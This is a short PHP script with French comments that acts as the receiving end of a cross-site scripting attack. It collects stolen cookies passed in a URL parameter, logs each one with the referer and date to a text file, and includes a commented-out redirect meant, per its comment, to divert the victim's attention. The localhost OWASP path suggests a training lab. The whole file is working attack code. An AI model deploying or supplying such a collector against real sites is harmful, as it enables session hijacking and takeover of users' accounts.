<?php
 
if(isset($_GET['c']) && is_string($_GET['c']) && !empty($_GET['c'])) {
 
	$referer = $_SERVER['HTTP_REFERER'];
	$date = date('d-m-Y \à H\hi');
	$data = "From :   $referer\r\nDate :   $date\r\nCookie : ".htmlentities($_GET['c'])."\r\n------------------------------\r\n";
 
        echo $data;
	$handle = fopen('cookies.txt','a');
	fwrite($handle, $data);
	fclose($handle);
 
}
 
 
// et on envoie la cible où l'on veut pour détourner son attention ;)
?>
<script language="javascript" type="text/javascript">
	//window.location.replace("http://localhost/owasp/public_html/accueil.php");
</script>